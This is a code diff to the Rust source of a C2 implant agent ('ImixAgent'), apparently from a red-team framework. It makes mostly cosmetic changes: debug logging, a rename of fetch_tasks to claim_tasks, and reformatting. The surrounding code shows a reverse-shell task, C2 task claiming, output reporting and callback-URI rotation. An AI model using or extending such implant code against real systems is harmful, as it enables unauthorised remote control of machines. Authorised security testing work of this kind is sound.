@@ -80,15 +80,18 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             }
         };
 
+        #[cfg(debug_assertions)]
+        log::info!("Flushing {} task outputs", outputs.len());
+
         if outputs.is_empty() {
             return;
         }
 
-        #[cfg(debug_assertions)]
-        log::info!("Flushing {} task outputs", outputs.len());
-
         let mut transport = self.transport.write().await;
         for output in outputs {
+            #[cfg(debug_assertions)]
+            log::info!("Task Output: {output:#?}");
+
             if let Err(_e) = transport.report_task_output(output).await {
                 #[cfg(debug_assertions)]
                 log::error!("Failed to report task output: {_e}");
@@ -140,8 +143,8 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         Ok(t)
     }
 
-    // Helper to fetch tasks and return them, so main can spawn
-    pub async fn fetch_tasks(&self) -> Result<Vec<pb::c2::Task>> {
+    // Helper to claim tasks and return them, so main can spawn
+    pub async fn claim_tasks(&self) -> Result<Vec<pb::c2::Task>> {
         let mut transport = self.transport.write().await;
         let beacon_info = self.config.read().await.info.clone();
         let req = ClaimTasksRequest {
@@ -169,7 +172,10 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         Fut: std::future::Future<Output = Result<R, anyhow::Error>>,
     {
         self.block_on(async {
-            let t = self.get_usable_transport().await.map_err(|e| e.to_string())?;
+            let t = self
+                .get_usable_transport()
+                .await
+                .map_err(|e| e.to_string())?;
             action(t).await.map_err(|e| e.to_string())
         })
     }
@@ -187,14 +193,14 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             // We need a transport for the subtask. Get it asynchronously.
             match agent.get_usable_transport().await {
                 Ok(transport) => {
-                    if let Err(e) = action(transport).await {
+                    if let Err(_e) = action(transport).await {
                         #[cfg(debug_assertions)]
-                        log::error!("Subtask {} error: {e:#}", task_id);
+                        log::error!("Subtask {} error: {_e:#}", task_id);
                     }
                 }
-                Err(e) => {
+                Err(_e) => {
                     #[cfg(debug_assertions)]
-                    log::error!("Subtask {} failed to get transport: {e:#}", task_id);
+                    log::error!("Subtask {} failed to get transport: {_e:#}", task_id);
                 }
             }
         });
@@ -263,7 +269,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
 
     fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
         self.spawn_subtask(task_id, move |transport| async move {
-             run_reverse_shell_pty(task_id, cmd, transport).await
+            run_reverse_shell_pty(task_id, cmd, transport).await
         })
     }
 
@@ -325,11 +331,11 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             if idx_val < uris.len() {
                 let current_uri = &uris[idx_val];
                 if let Some(pos) = current_uri.find("://") {
-                     let new_uri = format!("{}://{}", transport, &current_uri[pos + 3..]);
-                     uris[idx_val] = new_uri;
+                    let new_uri = format!("{}://{}", transport, &current_uri[pos + 3..]);
+                    uris[idx_val] = new_uri;
                 } else {
-                     let new_uri = format!("{}://{}", transport, current_uri);
-                     uris[idx_val] = new_uri;
+                    let new_uri = format!("{}://{}", transport, current_uri);
+                    uris[idx_val] = new_uri;
                 }
             }
             Ok(())
@@ -372,7 +378,9 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             if idx < uris.len() {
                 Ok(uris[idx].clone())
             } else {
-                uris.first().cloned().ok_or_else(|| "No callback URIs configured".to_string())
+                uris.first()
+                    .cloned()
+                    .ok_or_else(|| "No callback URIs configured".to_string())
             }
         })
     }
@@ -382,7 +390,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             let uris = self.callback_uris.read().await;
             let idx = *self.active_uri_idx.read().await;
             if uris.is_empty() {
-                 return Err("No callback URIs configured".to_string());
+                return Err("No callback URIs configured".to_string());
             }
             let next_idx = (idx + 1) % uris.len();
             Ok(uris[next_idx].clone())
